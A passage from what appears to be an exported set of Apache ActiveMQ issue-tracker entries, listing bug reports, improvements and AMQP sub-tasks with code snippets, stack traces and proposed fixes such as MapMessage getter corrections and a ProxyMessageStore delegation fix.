ActiveMqMapMessage, line ~437:    public double getDouble(String name) throws JMSException {        initializeReading();        Object value = map.get(name);        if (value == null) {            return 0;        }        if (value instanceof Double) {            return ((Double)value).doubleValue();        }        if (value instanceof Float) {            return ((Float)value).floatValue();        }        if (value instanceof UTF8Buffer) {            return Float.valueOf(value.toString()).floatValue();        }        if (value instanceof String) {            return Float.valueOf(value.toString()).floatValue();        } else {            throw new MessageFormatException(" cannot read a double from " + value.getClass().getName());        }    }Notice the ifs on String or UTF8Buffer and the use of Float.valueOf.I noticed this when Strings representing anything higher than Float.MAX_VALUE ended up as Infinity, and anything below Float.MIN_VALUE ended up as 0.
issueID:AMQ-5629
type:Bug
changed files:ActiveMQMapMessage.java
texts:MapMessage.getChar does not handle if the backing map contains String or UTF8
Compare to AMQ-5628.Read up on http://docs.oracle.com/javaee/1.4/api/javax/jms/MapMessage.html to see that getChar(key) shall be able to compute for something that was stored as a String.ActiveMQMapMessage, line ~312:    public char getChar(String name) throws JMSException {        initializeReading();        Object value = map.get(name);        if (value == null) {            throw new NullPointerException();        }        if (value instanceof Character) {            return ((Character)value).charValue();        } else {            throw new MessageFormatException(" cannot read a short from " + value.getClass().getName());        }    }Notice the absent handling of String or UTF8Buffer.Notice ALSO the wrong wording in the Exception "cannot read SHORT from.." when we"re in the CHAR getter.
issueID:AMQ-5630
type:New Feature
changed files:
texts:Provide a way to disable durable subscriptions from configuration.
When virtual topics are used exclusively - so each topic sub gets a shared or individual queue - it would be nice to be able to enforce that regular durable subs are not allowed and reject them with an exception.A broker boolean attribute: rejectDurableConsumers would be perfect.
issueID:AMQ-5631
type:Sub-task
changed files:
texts:AMQP: Add support for delete of temporary destinations
Right now a Temporary Destination created from a client is only deleted when its parent connection closes.  In order to support client delete of a temporary destination we need to handle close of the link that created that destination and remove it.
issueID:AMQ-5632
type:Bug
changed files:
texts:MapMessage.getBytes crashes with NPE if no value present
Compare to AMQ-5628 and AMQ-5629Read up on http://docs.oracle.com/javaee/1.4/api/javax/jms/MapMessage.htmlNotice the wording "if there is no item by this name, a null value is returned."ActiveMqMapMessage, line ~494:    /**     * Returns the byte array value with the specified name.     *     * @param name the name of the byte array     * @return a copy of the byte array value with the specified name; if there     *         is no item by this name, a null value is returned.     * @throws JMSException if the JMS provider fails to read the message due to     *                 some internal error.     * @throws MessageFormatException if this type conversion is invalid.     */    @Override    public byte[] getBytes(String name) throws JMSException {        initializeReading();        Object value = map.get(name);        if (value instanceof byte[]) {            return (byte[])value;        } else {            throw new MessageFormatException(" cannot read a byte[] from " + value.getClass().getName());        }    }Notice how the "else"-block will kick in on null value, whereby we get the "value.getClass()" executed when inside the constructor argument creation of the wrongly thrown MessageFormatException, resulting in NPE.Instead, a code block like every other getter has should be employed, here from getString right above:    public String getString(String name) throws JMSException {        initializeReading();        Object value = map.get(name);        if (value == null) {            return null;        }        if (value instanceof byte[]) {            throw new MessageFormatException("Use getBytes to read a byte array");        } else {            return value.toString();        }    }Notice the null-check with null-return.
issueID:AMQ-5636
type:Improvement
changed files:
texts:Upgrade the bundled DBCP component. The current one is very old and buggy.
The current DBCP component that ships with ActiveMQ is version 1.4. It dates from Feb 2010. After fours years of inactivity a number of releases were made in the last twelve months to the DBCP component. The most recent version, 2.1, was released on Feb 23rd 2015.Personally, I am seeing weird behavior with the DBCP 1.4 component when using it as a lease locker with KahaDB. When a connection is dropped the DBCP component doesn"t always handle it correctly which manifests itself as a lease lock failure from the broker"s standpoint.
issueID:AMQ-5637
type:Sub-task
changed files:
texts:AMQP: add support for mapping JMSType header to AMQP message Subject
The AMQP JMS Mapping is going to define mapping between the JMSType header and the Subject field of the AMQP message Properties section. The broker currently maps this using a message annotation used by the legacy Qpid JMS AMQP 1.0 client, so we should update to support the Subject mapping as will be used by the newer Qpid JMS client being implemented around the AMQP JMS Mapping.
issueID:AMQ-5639
type:Improvement
changed files:
texts:Allow advisory messages to traverse a broker network
Currently the filter applied to forwarding consumers is very restrictive. It will suppress all advisory messages. But only two types of advisory are used by the network bridge.Allowing the propagation of selective advisories, like new connection advisories is handy for monitoring at the application level.
issueID:AMQ-564
type:Improvement
changed files:TransactionContext.java
JDBCMessageStore.java
JDBCPersistenceAdapter.java
JDBCTopicMessageStore.java
DefaultJDBCAdapter.java
texts:When the JDBC database fails, log all the next exceptions so we see the root cause of the database failure.
None
issueID:AMQ-5640
type:Improvement
changed files:
texts:negative TotalMessageCount in JMX Broker MBean
Starting a broker with a few messages on a queue and consuming these messages will cause the TotalMessageCount property on the Broker MBean go to a negative value. That value should never go negative.
issueID:AMQ-5642
type:Improvement
changed files:
texts:Add ActiveMQXAConnectionFactory to ra.xml
Add ActiveMQXAConnectionFactory definition to ra.xml so that it can be used as an admin-object.
issueID:AMQ-5644
type:Bug
changed files:
texts:Autorization map doesn&#39;t handle wildcard subscriptions properly
Wildcard destination subscriptions are matched against all matching map entries. Instead, we should only return those entries that explicitly matches subscription wildcard.
issueID:AMQ-5645
type:Bug
changed files:
texts:CronParser.getNextScheduledTime() for the first day of every month
When we try to get a NextSecheduledTime for a cron string that should return next month"s first day ("0 1 1 * *") we get current month"s last day.For example: public static void main(String[] args){  try{     Date miFecha = new Date(CronParser.getNextScheduledTime("0 1 1 * *", System.currentTimeMillis()));       System.out.println(miFecha);        }catch(Exception e){     e.printStackTrace();  }  }This prints:Tue Mar 31 01:00:00 CEST 2015
issueID:AMQ-5648
type:Sub-task
changed files:
texts:AMQP: Update JMS Outbound transformer to add the mapping compliant destination type markers
The values used in the message annotation to indicate destination type are changed in the JMS over AMQP mapping and should now be applied in the outbound JMS transformer.  For now we can continue to apply the legacy annotations for the legacy QPid JMS client but should remove those in the future.
issueID:AMQ-5649
type:Bug
changed files:
texts:Maximum producers allowed per connection doesn&#39;t work for anonymous producers
There is a configuration option on TransportConnector to set the maximum number of producers allowed per connection.  This is validated in TransportConnection in the processAddProducer method.  The issue is that the code to enforce the check first tests if the destination is null and will not enforce the check if the destination is null. This means that when a client creates an anonymous producer on a session this setting will be ignored which is not the correct behavior.  Even if the producers are anonymous this option should still limit to the total number of producers on the connection.  The problem is here on line 605 of TransportConnection.java:if (destination != null && !AdvisorySupport.isAdvisoryTopic(destination)) {  ....}This simply should be changed to:if (!AdvisorySupport.isAdvisoryTopic(destination)) {  ....}I"ll be submitting a pull request (with unit tests) shortly.
issueID:AMQ-565
type:Improvement
changed files:AxionJDBCAdapter.java
DefaultStatementProvider.java
texts:Add index to expiration to improve cleanup query
Per Paul Smith on the user@ mailing list: ....Even with only a few thousand records in the table, the following:create index idx_activemqmsgs_expiration on activemq_msgs(expiration)appears to reduce the query plan cost of this scan by at least an order of magnitude, changing the scan from a Clustered Index Scan (that"s just a table scan in SQL Server, if the table has a clustered index), to an index scan.
issueID:AMQ-5652
type:Bug
changed files:IdGenerator.java
texts:IdGenerator not optimal in port restricted enviroments.
None
issueID:AMQ-5654
type:Improvement
changed files:WebClient.java
texts:Allow ActiveMQ authentication on server side for REST/Ajax clients.
Currently, for REST or Ajax clients to connect to a secured ActiveMQ, the client side needs to send the activemq credentials over HTTP.It should be possible to use a different authentication mechanism for the HTTP connection, and let the servlet use a system account to connect to ActiveMQ.Additionally, it would be great to allow ${} placeholders in the servlet context parameters, which could be resolved by system properties.
issueID:AMQ-5655
type:Sub-task
changed files:AmqpProtocolConverter.java
texts:AMQP: Add connection property to open frame when connection attempt has failed
An AMQP Connection that is opened by a remote peer requires that the broker also send an open frame prior to sending any close frame with an error condition set to indicate failure.  This can lead to the remote peer appearing to be open for a short while before receiving the follow on close frame.  In order to make it know to a client that its open request has actually failed the connection property "amqp:connection-establishment-failed" as a hint that a close frame follows.
issueID:AMQ-5656
type:Bug
changed files:
texts:Support selective MBean creation
A continuation of http://activemq.2283324.n4.nabble.com/How-to-disable-MBeans-creation-tp4692863p4692904.html where I asked about a feature to suppress MBean creation for certain objects, such as sessions, producers, consumers.Quoting Gary:There is a single code entry point (ManagementContext.registerMBean) for all MBean registration in the broker so gating that on a filter or regexp match may be all that we need.
issueID:AMQ-5657
type:Improvement
changed files:pom.xml
BrokerConfiguration.java
BrokerComponent.java
BrokerEndpoint.java
texts:Upgrade to Camel 2.15.0
Upgrade Camel
issueID:AMQ-5659
type:Improvement
changed files:Queue.java
texts:Add safety measure against infinite loop when store exception prevents message removal
When the broker is configured with a database store, the "purge" operation enters an infinite loop when the message removal operation fails, for instance when the broker datasource is being restarted (see example stack trace below). Here is a patch which adds a safety measure, in case the "dequeue" count of the queue does not increase between 2 messages removal operations.  The check is not garanteed to detect the problem on the next iteration, because a business consumer might also be dequeuing messages from the queue.  But the "purge" is probably much faster than the business consumer, so if it fails to remove 2 messages in a row, it is enough to detect the problem and abort the infinite loop.2015-03-05 15:38:30,353 | WARN  | 14571659-2202099 |  | JDBCPersistenceAdapter           | Could not get JDBC connection: Data source is closedjava.sql.SQLException: Data source is closed at org.apache.commons.dbcp.BasicDataSource.createDataSource(BasicDataSource.java:1362) at org.apache.commons.dbcp.BasicDataSource.getConnection(BasicDataSource.java:1044) at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58) at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.getStoreSequenceId(DefaultJDBCAdapter.java:285) at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.getStoreSequenceIdForMessageId(JDBCPersistenceAdapter.java:787) at org.apache.activemq.store.jdbc.JDBCMessageStore.removeMessage(JDBCMessageStore.java:194) at org.apache.activemq.store.memory.MemoryTransactionStore.removeMessage(MemoryTransactionStore.java:358) at org.apache.activemq.store.memory.MemoryTransactionStore$1.removeAsyncMessage(MemoryTransactionStore.java:166) at org.apache.activemq.broker.region.Queue.acknowledge(Queue.java:846) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1602) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1594) at org.apache.activemq.broker.region.Queue.removeMessage(Queue.java:1579) at org.apache.activemq.broker.region.Queue.purge(Queue.java:1158) at org.apache.activemq.broker.jmx.QueueView.purge(QueueView.java:54)
issueID:AMQ-5661
type:Sub-task
changed files:
texts:AMQP: Honor receiver flow as the true prefetch value on a link.
We currently don"t honor the flow values sent from a receiver to indicate how many messages our sender can produce (prefetch) and always maintain a fixed value based either on a transport configuration option or the first non-zero flow.  This is however not in keeping with how the credit model is expected to work in AMQP and leads to some issues with the brokers sender accepting messages and buffering them until the receiver sends a flow thereby preventing those messages from being dispatched to another receiver subscribed to the same destination.  We need to honor the link credit and only dispatch when the receiver indicates it is willing to take messages by sending more link credit.
issueID:AMQ-5662
type:Improvement
changed files:dispatcher-servlet.xml
message.jsp
RetryMessage.java
MessageQuery.java
texts:Improve web console retry to support all DLQ names
In web console, there is a "retry" link on a message when the name of browsed queue starts with DLQ. or DLT. The retry action in the console moves the letter to a queue named the same as the dead letter queue but without DLQ. or DLT.ActiveMQ, however, allows to use any name on a DLQ by using dead letter strategies. A shared strategy is the default, and the original destination is encoded in each message. The current implementation in web console cannot handle the default DLQ strategy in ActiveMQ, which has one single DLQ named ActiveMQ.DLQ.The suggested fix is to not rely on "move" to do a retry, but to use the built in retry mechanism instead. The second part of the fix is to only show the retry link when dealing with a real DLQ. A boolean is available through JMX.
issueID:AMQ-5665
type:Bug
changed files:MemoryTransactionStore.java
texts:memory store is broken in 5.11.0 for advisories (and probably other issues as well)
We"re running 5.10.2 and don"t encounter this issue.  We"re running a non-persistent broker in production and testing so that"s why we found this issue.It looks like 5.11.0 introduced this issue.Essentially Advisories fail to fire. It looks like it’s a bug with MemoryTransactionStore. Switching to persistent brokers fixes the problem.It’s because addMessage calls:        } else {            destination.addMessage(null, message);        }.. with an explicit null.the message given is:2015-03-16 12:54:17,538 WARN &#91;ActiveMQ Transport: tcp:///127.0.0.1:56468@16161&#93; org.apache.activemq.advisory.AdvisoryBroker Failed to fire delivered advisory, reason: java.lang.NullPointerException… and I saw this when I was running mvn test in the main ActiveMQ test suite (or at least pretty sure I did) so this is happening not just in my code. The full exception , which I captured by setting a break point is below. java.lang.NullPointerException at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:626) at org.apache.activemq.advisory.AdvisoryBroker.messageDelivered(AdvisoryBroker.java:397) at org.apache.activemq.broker.BrokerFilter.messageDelivered(BrokerFilter.java:349) at org.apache.activemq.broker.BrokerFilter.messageDelivered(BrokerFilter.java:349) at org.apache.activemq.broker.MutableBrokerFilter.messageDelivered(MutableBrokerFilter.java:360) at org.apache.activemq.broker.MutableBrokerFilter.messageDelivered(MutableBrokerFilter.java:360) at org.apache.activemq.broker.region.BaseDestination.messageDelivered(BaseDestination.java:518) at org.apache.activemq.broker.region.Queue.messageSent(Queue.java:1806) at org.apache.activemq.broker.region.Queue.doPendingCursorAdditions(Queue.java:794) at org.apache.activemq.broker.region.Queue.orderedCursorAdd(Queue.java:875) at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:854) at org.apache.activemq.broker.region.Queue.send(Queue.java:733) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:419) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:468) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:297) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:152) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:307) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:157) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:157) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:541) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:768) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:724)... the core issue here looks like the message doesn"t have a TransactionId and MemoryTransactionStore has an addMessages which has a fall through of addMessage with a null context which then causes the NPE.Did messages have an implicit transaction Id before?
issueID:AMQ-5666
type:Sub-task
changed files:
texts:AMQP: Create unit tests to validate behavior of AMQP implementation against spec and mapping requirements.
Now that we can use the simple client for testing we need to create lower level tests to validate AMQP behavior on the broker against the AMQP v1.0 spec and the JMS mapping spec.
issueID:AMQ-5668
type:Bug
changed files:
texts:NPE in kahadb with concurrentStoreAndDispatchTopics when sending MQTT msgs with different QoS
Running KahaDB with concurrentStoreAndDispatchTopics="true" and sending 3 MQTT messages using different QoS values raises 2015-03-17 13:27:48,866 WARN ActiveMQ NIO Worker 2 - Failed to send MQTT Publish:java.lang.NullPointerException at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.setLastCachedId(AbstractStoreCursor.java:319) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.trackLastCached(AbstractStoreCursor.java:280) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.addMessageLast(AbstractStoreCursor.java:213) at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.addMessageLast(TopicStorePrefetch.java:74) at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.addMessageLast(StoreDurableSubscriberCursor.java:198) at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:159) at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:274) at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:48) at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:717) at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:510) at org.apache.activemq.broker.region.Topic.send(Topic.java:441) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:419) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:468) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:297) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:152) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:307) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:157) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:541) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:768) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45) at org.apache.activemq.transport.mqtt.MQTTInactivityMonitor.onCommand(MQTTInactivityMonitor.java:147) at org.apache.activemq.transport.mqtt.MQTTTransportFilter.sendToActiveMQ(MQTTTransportFilter.java:106) at org.apache.activemq.transport.mqtt.MQTTProtocolConverter.sendToActiveMQ(MQTTProtocolConverter.java:173) at org.apache.activemq.transport.mqtt.MQTTProtocolConverter.onMQTTPublish(MQTTProtocolConverter.java:445) at org.apache.activemq.transport.mqtt.MQTTProtocolConverter.onMQTTCommand(MQTTProtocolConverter.java:210) at org.apache.activemq.transport.mqtt.MQTTTransportFilter.onCommand(MQTTTransportFilter.java:94) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.mqtt.MQTTCodec$1.onFrame(MQTTCodec.java:54) at org.apache.activemq.transport.mqtt.MQTTCodec.processCommand(MQTTCodec.java:79) at org.apache.activemq.transport.mqtt.MQTTCodec.access$400(MQTTCodec.java:26) at org.apache.activemq.transport.mqtt.MQTTCodec$4.parse(MQTTCodec.java:194) at org.apache.activemq.transport.mqtt.MQTTCodec$3.parse(MQTTCodec.java:160) at org.apache.activemq.transport.mqtt.MQTTCodec$2.parse(MQTTCodec.java:123) at org.apache.activemq.transport.mqtt.MQTTCodec.parse(MQTTCodec.java:65) at org.apache.activemq.transport.mqtt.MQTTNIOTransport.serviceRead(MQTTNIOTransport.java:105) at org.apache.activemq.transport.mqtt.MQTTNIOTransport.access$000(MQTTNIOTransport.java:43) at org.apache.activemq.transport.mqtt.MQTTNIOTransport$1.onSelect(MQTTNIOTransport.java:66) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:97) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)
issueID:AMQ-567
type:New Feature
changed files:DestinationViewMBean.java
StubBroker.java
RegionBroker.java
AdvisoryBroker.java
PropertyExpression.java
TransportConnection.java
DestinationStatistics.java
DestinationView.java
texts:Time in queue statistics handy
It would be very keen if the JMX console exposed queue statistics, such as average length of time in queue for current messages, longest/shortest time in queue for current messages, average time in queue for serviced messages (as opposed to those waiting), longestlshortest time for same, and a list of messages in the queue with when they were posted, and how long they have been waiting.
issueID:AMQ-5672
type:Improvement
changed files:
texts:Add an option to virtual topic selector cache to enforce only a single selector at a given time
At the moment, the virtualTopicSelectorCache is pretty bare bones. we should allow configuration of the persist period, the file location, and some operational insight via JMX. We should also allow to configure the cache to a single number of selectors to enforce automatic clean-up for non-used selectors (and avoid large pileups of messages) and to ensure consistent usage across the queues that are used in the virtual topic.
issueID:AMQ-5674
type:Bug
changed files:
texts:initialRedeliveryDelay not respected
Setting initialRedeliveryDelay on redelivery policy is not used in some use cases. In case of a session rollback, the delay is wrongly calculated as redelivery counter is incremented before. Also, according to the docs redeliveryDelay should only be used if initialRedeliveryDelay = 0, which is not the case.
issueID:AMQ-568
type:Bug
changed files:BrokerService.java
texts:The BrokerService is not setting the taskRunnerFactory property of the TransportConnector.
This causes all messages to be dispatched to clients sync (dispatchAsync setting would not be honored.)
issueID:AMQ-5680
type:Bug
changed files:MessageBrokerView.java
texts:MessageBrokerView.getTempQueues() have test for destination.isTopic() instead of destination.isQueue()
The following code is a near-copy of the .getTempTopics() right above - without the change of the "if (destination.isTopic()..." to "if (destination.isQueue()..."    /**     * Retrieve a set of all TemporaryQueues be used by the Broker     * @return  all TemporaryQueues     */    public Set<ActiveMQTempQueue> getTempQueues(){        Set<ActiveMQTempQueue> result = new HashSet<ActiveMQTempQueue>();        for (ActiveMQDestination destination:getDestinations()){            if (destination.isTopic() && destination.isTemporary()){                result.add((ActiveMQTempQueue) destination);            }        }        return result;    }
issueID:AMQ-5684
type:Bug
changed files:
texts:AMQP: messages get stuck
While investigating AMQ-5646 the same test failed in a different way.It did not progress as far. The test: Client opens a connection and a session. Client opens a sender and sends 20 messages Client opens a receiver with a credit of twoThe receiver receives one message and that"s all. The expectation is to receive two messages.A trace to be attached.
issueID:AMQ-5685
type:Bug
changed files:
texts:Purge does not work when simple authorisation plugin is used
When clicking purge from the web console the page refreshes without purging the queue.  It appears that the Destinations are checked to be an instanceof Queue before trying the purge call, however the authorisation plugin wraps destinations with destinationfilters and so no purge can happen.
issueID:AMQ-5686
type:Bug
changed files:ProxyMessageStore.java
texts:ProxyMessageStore doesn&#39;t properly delegate
In ProxyMessageStore the method asyncAddTopicMessage does not call the delegate method as it should.  This causes a StackOverflowError if the method is called as it will just recursively keep calling the same method over and over again.The problem is here on line 141 of ProxyMessageStore.java:@Overridepublic ListenableFuture<Object> asyncAddTopicMessage(ConnectionContext context, Message message, boolean canOptimizeHint) throws IOException {  return asyncAddTopicMessage(context,message,canOptimizeHint);}This simply should be changed to:@Overridepublic ListenableFuture<Object> asyncAddTopicMessage(ConnectionContext context, Message message, boolean canOptimizeHint) throws IOException {  return delegate.asyncAddTopicMessage(context,message,canOptimizeHint);}
issueID:AMQ-5689
type:Bug
changed files:
texts:Queue dispatching hangs when there are redelivered messages that don&#39;t match current consumer&#39;s selectors
If a queue has messages that it needs to redeliver, it will stall when the only current consumers have selectors that don"t match because dispatching only takes into account redeliveries until they"re empty.. but there may be other messages that don"t match that need to be delivered.Have patch
issueID:AMQ-5693
type:Improvement
changed files:ActiveMQEndpoint.java
texts:Expose camel component meta model like camel-catalog does
Apache Camel has introduced the camel-catalog which enables third party tools to lookup what parameters the component provides together with data types, labels, etc. Basically it generates a json file which contains the needed information and ships it inside the components jar.The ActiveMQ component currently doesn"t ship such a json file and it would be good to align with what Camel has done with their components. Claus Ibsen is the right person to ask what exactly is needed.
issueID:AMQ-5697
type:Bug
changed files:
texts:Authorization map doesn&#39;t handle composite destinations properly
If two destinations are specified explicitly in the authorization map, like   <authorizationEntry topic="QUEUEA" read="admins" write="admins" admin="admins"/>   <authorizationEntry topic="QUEUEB" read="admins" write="admins" admin="admins"/> trying to connect to the composite destination "QUEUEA,QUEUEB" will fail.
issueID:AMQ-5698
type:Bug
changed files:AmqpSslTransportFactory.java
AmqpNioTransportFactory.java
AmqpTransportFactory.java
IDERunner.java
texts:AMQP: Transport factories are not applying wireFormat.* options to newly created Transport instances.
The options specified on the transportConnector that should be setting values in the AmqpWireFormat object are not getting passed along to the IntrospectionSupport property set so none of those get applied for a new connection.  We need to extract the wireFormat. prefixed options and then apply them to the AmqpWireFormat owned by the transport filter.
issueID:AMQ-5699
type:Task
changed files:AmqpSender.java
AmqpReceiver.java
texts:AMQP: Update to released Proton-J 0.9.1
Update the Proton-J dependency to 0.9.1
issueID:AMQ-570
type:Task
changed files:
texts:Create sample activemq.xml files under assembly/src/sample-conf similar to what we had in 3.x
None
issueID:AMQ-5703
type:Bug
changed files:
texts:kahadb - index recovery - corrupt journal records cannot be skipped
Working with some corrupt data stores - if corruption occurs in the middle of a journal and the index needs to be rebuilt we get:java.io.EOFException at java.io.RandomAccessFile.readFully(RandomAccessFile.java:446) at java.io.RandomAccessFile.readFully(RandomAccessFile.java:424) at org.apache.activemq.util.RecoverableRandomAccessFile.readFully(RecoverableRandomAccessFile.java:75) at org.apache.activemq.store.kahadb.disk.journal.DataFileAccessor.readRecord(DataFileAccessor.java:87) at org.apache.activemq.store.kahadb.disk.journal.Journal.read(Journal.java:641) at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:1014) at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:606) at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:400) at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:418) at org.apache.activemq.store.kahadb.MessageDatabase.doStart(MessageDatabase.java:262) at org.apache.activemq.store.kahadb.KahaDBStore.doStart(KahaDBStore.java:206) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.doStart(KahaDBPersistenceAdapter.java:223) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) at org.apache.activemq.broker.BrokerService.doStartPersistenceAdapter(BrokerService.java:652) at org.apache.activemq.broker.BrokerService.startPersistenceAdapter(BrokerService.java:641) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:606)attempting to read an invalid location. This stops further recovery and the entire journal needs to be removed to progress.We have already identified the corrupt record, we just need to skip it when we replay.
issueID:AMQ-5704
type:Bug
changed files:AmqpAuthenticator.java
texts:AMQP: SASL Mechanisms sent in the wrong order.
During the SASL handshake the broker advertises the supported mechanisms as  "ANONYMOUS", "PLAIN" however the AMQP v1.0 specification requires the mechanisms be sent in decreasing order of preference.
issueID:AMQ-5705
type:Bug
changed files:
texts:originBrokerURL incorrectly set in advisory messages
With a broker configured with multiple transports, the "originBrokerURL" property of advisory messages is incorrectly set. Assuming a broker that has two transports configured, an advisory message for a connection made to transport-A may have the "originBrokerURL" property set to transport-B.Looks like the "originBrokerURL" value is set from the getDefaultSocketURIString() method in the BrokerService class. Is there a good reason why the "originBrokerURL" value does not correlate with the transport where the advisory event is actually being triggered?
issueID:AMQ-5707
type:Task
changed files:
texts:AMQP: Investigate the affact of abort slow consumer strategy on sender links
Need to investigate and write some tests around what happens when the abort slow consumer strategy is in play and it attempts to close the consumer which would be mapped to an AMQP sender end of the link on the broker side.  We probably need to intercept the ConsumerControl and close the appropriate link.
issueID:AMQ-5709
type:Improvement
changed files:
texts:Logging of "Database ... is locked" should be done on level DEBUG
The SharedFileLocker tries to acquire a lock on the activemq lock file.  Everytime it can not lock it outputs the logging message below at INFO level.  On the slave it will try this forever till the master is down.So I propose we only log on DEBUG level so the messages do not fill up a log with a global default info log level.2015-04-07 12:35:36,522 | INFO  | Database .../activemq/data/lock is locked... waiting 10 seconds for the database to be unlocked. Reason: java.io.IOException: File ".../activemq/data/lock" could not be locked. | org.apache.activemq.store.SharedFileLocker | main
issueID:AMQ-5710
type:Bug
changed files:
texts:ActiveMQConnection cleanup should not close the connection on the broker
As the spec sayshttp://docs.oracle.com/javaee/6/api/javax/resource/spi/ManagedConnection.html#cleanup()"The cleanup of ManagedConnection instance resets its client specific state and prepares the connection to be put back in to a connection pool. The cleanup method should not cause resource adapter to close the physical pipe and reclaim system resources associated with the physical connection."We should not send RemoveInfo on cleanup, but just clean client side state. The result of "closing" a connection on cleanup is that connection will not be cached when using XA transactions, causing high CPU usage on the broker.
issueID:AMQ-5711
type:Bug
changed files:
texts:[AMQP] Consumer on named temporary queue results in NullPointerException
Attempting to create a consumer on a named temporary queue ("temp-queue://<name>") via AMQP results in a NullPointerException. Following minimal test client using the Qpid AMQP client (qpid-amqp-1-0-client-jms) demonstrates the problem (imports elided for brevity):public class MinimalAmqpTest {    public static void main(String[] args) throws Exception {        try (InputStream propertiesStream =                MinimalAmqpTest.class.getResourceAsStream("amqp.properties")) {            Properties properties = new Properties();            properties.load(propertiesStream);            Context context = new InitialContext(properties);            ConnectionFactory connectionFactory =                (ConnectionFactory) context.lookup("localhost");            Connection connection = connectionFactory.createConnection();                        connection.start();             Queue queue = (Queue) context.lookup("test");            Session consumerSession =                connection.createSession(false, Session.AUTO_ACKNOWLEDGE);            consumerSession.createConsumer(queue);        }    }}Where amqp.properties looks something like this:java.naming.factory.initial = org.apache.qpid.amqp_1_0.jms.jndi.PropertiesFileInitialContextFactoryconnectionfactory.localhost = amqp://172.16.133.147:5672?clientid=test-clientqueue.test = temp-queue://testRunning this test against an AMQP-enabled ActiveMQ 5.11.1, 5.10.2 or 5.10.1 broker results in an NPE:java.lang.NullPointerException        at org.apache.activemq.broker.region.TempQueue.addSubscription(TempQueue.java:72)        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:319)        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:427)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:107)        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:663)        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:348)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334)        at 